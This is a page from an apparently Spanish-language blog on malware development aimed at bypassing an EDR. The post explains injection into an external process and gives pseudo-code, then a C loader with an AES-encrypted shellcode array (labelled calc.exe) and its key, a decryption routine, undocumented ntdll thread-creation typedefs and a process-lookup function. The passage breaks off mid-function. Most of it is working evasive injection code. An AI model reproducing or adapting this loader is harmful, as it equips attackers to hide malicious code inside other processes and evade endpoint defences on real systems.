<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="/assets/css/style.css?v=">
    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->

<!-- Setup theme-color -->
<!-- start theme color meta headers -->
<meta name="theme-color" content="#151515">
<meta name="msapplication-navbutton-color" content="#151515">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<!-- end theme color meta headers -->


<!-- Setup Google Analytics -->



<!-- You can set your favicon here -->
<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->

<!-- end custom head snippets -->


<!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Bypaseando mis limitaciones | El blog se centra en el aprendizaje del desarrollo de malware con el objetivo final de realizar bypass de un EDR</title>
<meta name="generator" content="Jekyll v4.3.2" />
<meta property="og:title" content="Bypaseando mis limitaciones" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="El blog se centra en el aprendizaje del desarrollo de malware con el objetivo final de realizar bypass de un EDR" />
<meta property="og:description" content="El blog se centra en el aprendizaje del desarrollo de malware con el objetivo final de realizar bypass de un EDR" />
<link rel="canonical" href="http://localhost:4000/external_process_injection.html" />
<meta property="og:url" content="http://localhost:4000/external_process_injection.html" />
<meta property="og:site_name" content="Bypaseando mis limitaciones" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Bypaseando mis limitaciones" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"WebPage","description":"El blog se centra en el aprendizaje del desarrollo de malware con el objetivo final de realizar bypass de un EDR","headline":"Bypaseando mis limitaciones","url":"http://localhost:4000/external_process_injection.html"}</script>
<!-- End Jekyll SEO tag -->

  </head>

  <body>

    <header>
      <div class="container">
        <a id="a-title" href="/">
          <h1>Bypaseando mis limitaciones</h1>
        </a>
        <h2>El blog se centra en el aprendizaje del desarrollo de malware con el objetivo final de realizar bypass de un EDR</h2>

        <section id="downloads">
          
            <a href="" class="btn">Download as .zip</a>
            <a href="" class="btn">Download as .tar.gz</a>
          
          <a href="" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
        </section>
      </div>
    </header>

    <div class="container">
      <section id="main_content">
        <h2 id="inyección-en-proceso-externo">Inyección en proceso externo</h2>

<p>En ocasiones, por diferentes motivos los atacantes tratan de comprometer un proceso externo al binario malicioso en el sistema operativo en el que se ejecuta.
Los motivos pueden ser:</p>
<ul>
  <li>Evasión: desviar la actividad maliciosa del binario que la  provoco es una técnica efectiva que solo puede ser detectada con telemetría a bajo nivel sobre el sistema opertivo en el que se ejecutó.</li>
  <li>Persistencia: tras la ejecución del proceso malicioso en el sistema opertivo, en muchos casos es necesario dejar una vía de comunicación constante desde una proceso que no finilace en el propio sistema comprometido.</li>
</ul>

<h3 id="diagrama-asociado-a-la-inyección">Diagrama asociado a la inyección</h3>

<p><img src="/assets/images/external_process_injection.png" alt="Inyección en proceso externo" /></p>

<h3 id="pseudo-codigo">Pseudo-codigo</h3>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// 1. Tras buscar el pid del proceso externo se revisan los privilegios y se abre</span>
<span class="n">hRemoteProcess</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span><span class="n">PROCESS_ALL_ACCESS</span><span class="p">,...,</span> <span class="n">RemoteProcessID</span><span class="p">)</span>

<span class="c1">// 2. Se reserva memoria en el context del proceso externo</span>
<span class="n">pRemoteCode</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">hRemoteProcess</span><span class="p">,...,</span> <span class="n">BufferSize</span><span class="p">,...,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">)</span>

<span class="c1">// 3. Escritura en el buffer de memoria reservado para el proceso externo</span>
<span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">hRemoteProcess</span><span class="p">,</span> <span class="n">pRemoteCode</span><span class="p">,</span> <span class="n">Shellcode</span><span class="p">,</span> <span class="n">ShellcodeSize</span><span class="p">,...)</span>

<span class="c1">// 4. Ejecución de un hilo en el proceso externo para que ejecute el código escrito en el buffer</span>
<span class="n">CreateRemoteThread</span><span class="p">(</span><span class="n">hRemoteProcess</span><span class="p">,...,</span> <span class="n">pRemoteCode</span><span class="p">,</span> <span class="p">...)</span>      <span class="c1">// Opción1: API clasica</span>
<span class="n">RtlCreateUserThread</span><span class="p">(</span><span class="n">hRemoteProcess</span><span class="p">,</span> <span class="p">...,</span> <span class="n">pRemoteCode</span><span class="p">,</span> <span class="p">...,</span> <span class="o">&amp;</span><span class="n">hThread</span><span class="p">,</span> <span class="p">...)</span>    <span class="c1">// Opción2: librería ntdll.dll</span>
<span class="n">NtCreateThreadEx</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hThread</span><span class="p">,...,</span> <span class="n">hRemoteProcess</span><span class="p">,</span> <span class="n">pRemoteCode</span><span class="p">,...)</span>        <span class="c1">// Opción3: librería ntdll.dll</span>
</code></pre></div></div>
<h3 id="código-fuente">Código fuente</h3>

<p>Siguiendo el pseudo-codigo extisten diferentes formas de realizar la misma inyección:</p>

<h4 id="createremotethread">CreateRemoteThread()</h4>

<p>Inyección del tipo 1 desde un binario: CreateRemoteThread</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;winternl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;tlhelp32.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;wincrypt.h&gt;</span><span class="cp">
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
</span>
<span class="c1">// calc.exe</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">payload</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x9d</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x9c</span><span class="p">,</span> <span class="mh">0x99</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0xd</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0xfa</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x3b</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">,</span> <span class="mh">0xa0</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xb</span><span class="p">,</span> <span class="mh">0xf4</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0xba</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0xce</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0xf3</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span> <span class="mh">0xc6</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0x5</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xc8</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0xe2</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0xe</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> <span class="mh">0xc8</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0xfd</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0xd5</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0xd1</span><span class="p">,</span> <span class="mh">0xbe</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0xb6</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0x8</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0xd3</span><span class="p">,</span> <span class="mh">0xd8</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x8f</span><span class="p">,</span> <span class="mh">0xa4</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x3e</span><span class="p">,</span> <span class="mh">0xc6</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0xb9</span><span class="p">,</span> <span class="mh">0xd9</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x4b</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0xa2</span><span class="p">,</span> <span class="mh">0x1d</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0xd6</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0xf4</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0xfc</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0xc3</span><span class="p">,</span> <span class="mh">0xe</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0x1a</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x9c</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0xd4</span><span class="p">,</span> <span class="mh">0xa7</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0xec</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x4f</span><span class="p">,</span> <span class="mh">0x4b</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0xf1</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0x6d</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0xa1</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0x2</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span> <span class="mh">0x4d</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0xba</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x5</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0xd1</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0xa9</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0xde</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0x6</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x7e</span><span class="p">,</span> <span class="mh">0xe2</span><span class="p">,</span> <span class="mh">0xa2</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x2a</span><span class="p">,</span> <span class="mh">0x92</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x3</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x8f</span> <span class="p">};</span>
<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">);</span>
<span class="kt">char</span> <span class="n">key</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0xef</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xce</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0xc3</span> <span class="p">};</span>

<span class="c1">// http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/Executable%20Images/RtlCreateUserThread.html</span>
<span class="k">typedef</span> <span class="k">struct</span> <span class="n">_CLIENT_ID</span> <span class="p">{</span>
	<span class="n">HANDLE</span> <span class="n">UniqueProcess</span><span class="p">;</span>
	<span class="n">HANDLE</span> <span class="n">UniqueThread</span><span class="p">;</span>
<span class="p">}</span> <span class="n">CLIENT_ID</span><span class="p">,</span> <span class="o">*</span><span class="n">PCLIENT_ID</span><span class="p">;</span>

<span class="k">typedef</span> <span class="nf">LPVOID</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">VirtualAlloc_t</span><span class="p">)(</span>
	<span class="n">LPVOID</span> <span class="n">lpAddress</span><span class="p">,</span>
	<span class="n">SIZE_T</span> <span class="n">dwSize</span><span class="p">,</span>
	<span class="n">DWORD</span>  <span class="n">flAllocationType</span><span class="p">,</span>
	<span class="n">DWORD</span>  <span class="n">flProtect</span><span class="p">);</span>
	
<span class="k">typedef</span> <span class="nf">VOID</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">RtlMoveMemory_t</span><span class="p">)(</span>
	<span class="n">VOID</span> <span class="n">UNALIGNED</span> <span class="o">*</span><span class="n">Destination</span><span class="p">,</span> 
	<span class="k">const</span> <span class="n">VOID</span> <span class="n">UNALIGNED</span> <span class="o">*</span><span class="n">Source</span><span class="p">,</span> 
	<span class="n">SIZE_T</span> <span class="n">Length</span><span class="p">);</span>

<span class="k">typedef</span> <span class="nf">FARPROC</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">RtlCreateUserThread_t</span><span class="p">)(</span>
	<span class="n">IN</span> <span class="n">HANDLE</span> <span class="n">ProcessHandle</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PSECURITY_DESCRIPTOR</span> <span class="n">SecurityDescriptor</span> <span class="n">OPTIONAL</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">BOOLEAN</span> <span class="n">CreateSuspended</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">ULONG</span> <span class="n">StackZeroBits</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">OUT</span> <span class="n">PULONG</span> <span class="n">StackReserved</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">OUT</span> <span class="n">PULONG</span> <span class="n">StackCommit</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PVOID</span> <span class="n">StartAddress</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PVOID</span> <span class="n">StartParameter</span> <span class="n">OPTIONAL</span><span class="p">,</span>
	<span class="n">OUT</span> <span class="n">PHANDLE</span> <span class="n">ThreadHandle</span><span class="p">,</span>
	<span class="n">OUT</span> <span class="n">PCLIENT_ID</span> <span class="n">ClientId</span><span class="p">);</span>

<span class="k">typedef</span> <span class="nf">NTSTATUS</span> <span class="p">(</span><span class="n">NTAPI</span> <span class="o">*</span> <span class="n">NtCreateThreadEx_t</span><span class="p">)(</span>
	<span class="n">OUT</span> <span class="n">PHANDLE</span> <span class="n">hThread</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">ACCESS_MASK</span> <span class="n">DesiredAccess</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PVOID</span> <span class="n">ObjectAttributes</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">HANDLE</span> <span class="n">ProcessHandle</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PVOID</span> <span class="n">lpStartAddress</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PVOID</span> <span class="n">lpParameter</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">ULONG</span> <span class="n">Flags</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">SIZE_T</span> <span class="n">StackZeroBits</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">SIZE_T</span> <span class="n">SizeOfStackCommit</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">SIZE_T</span> <span class="n">SizeOfStackReserve</span><span class="p">,</span>
	<span class="n">OUT</span> <span class="n">PVOID</span> <span class="n">lpBytesBuffer</span><span class="p">);</span>


<span class="kt">int</span> <span class="nf">AESDecrypt</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span> <span class="n">payload</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">key</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">keylen</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">HCRYPTPROV</span> <span class="n">hProv</span><span class="p">;</span>
	<span class="n">HCRYPTHASH</span> <span class="n">hHash</span><span class="p">;</span>
	<span class="n">HCRYPTKEY</span> <span class="n">hKey</span><span class="p">;</span>

	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptAcquireContextW</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hProv</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">PROV_RSA_AES</span><span class="p">,</span> <span class="n">CRYPT_VERIFYCONTEXT</span><span class="p">)){</span>
			<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptCreateHash</span><span class="p">(</span><span class="n">hProv</span><span class="p">,</span> <span class="n">CALG_SHA_256</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hHash</span><span class="p">)){</span>
			<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptHashData</span><span class="p">(</span><span class="n">hHash</span><span class="p">,</span> <span class="p">(</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span> <span class="n">key</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span> <span class="n">keylen</span><span class="p">,</span> <span class="mi">0</span><span class="p">)){</span>
			<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>              
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptDeriveKey</span><span class="p">(</span><span class="n">hProv</span><span class="p">,</span> <span class="n">CALG_AES_256</span><span class="p">,</span> <span class="n">hHash</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">hKey</span><span class="p">)){</span>
			<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
	
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptDecrypt</span><span class="p">(</span><span class="n">hKey</span><span class="p">,</span> <span class="p">(</span><span class="n">HCRYPTHASH</span><span class="p">)</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">BYTE</span> <span class="o">*</span><span class="p">)</span> <span class="n">payload</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">payload_len</span><span class="p">)){</span>
			<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
	
	<span class="n">CryptReleaseContext</span><span class="p">(</span><span class="n">hProv</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
	<span class="n">CryptDestroyHash</span><span class="p">(</span><span class="n">hHash</span><span class="p">);</span>
	<span class="n">CryptDestroyKey</span><span class="p">(</span><span class="n">hKey</span><span class="p">);</span>
	
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>


<span class="kt">int</span> <span class="nf">FindProcess</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">procname</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">HANDLE</span> <span class="n">hProcSnap</span><span class="p">;</span>
        <span class="n">PROCESSENTRY32</span> <span class="n">pe32</span><span class="p">;</span>
        <span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">hProcSnap</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPPROCESS</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span><span class="c1">//se crear un snapshot de los procesos en ejecución del sistema operativo</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">INVALID_HANDLE_VALUE</span> <span class="o">==</span> <span class="n">hProcSnap</span><span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
                
        <span class="n">pe32</span><span class="p">.</span><span class="n">dwSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PROCESSENTRY32</span><span class="p">);</span> <span class="c1">// se obtiene el tamaño total del objeo definido</span>
                
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">Process32First</span><span class="p">(</span><span class="n">hProcSnap</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe32</span><span class="p">))</span> <span class="p">{</span> <span class="c1">// validación del snapshot creado</span>
                <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hProcSnap</span><span class="p">);</span>
                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="p">}</span>
                
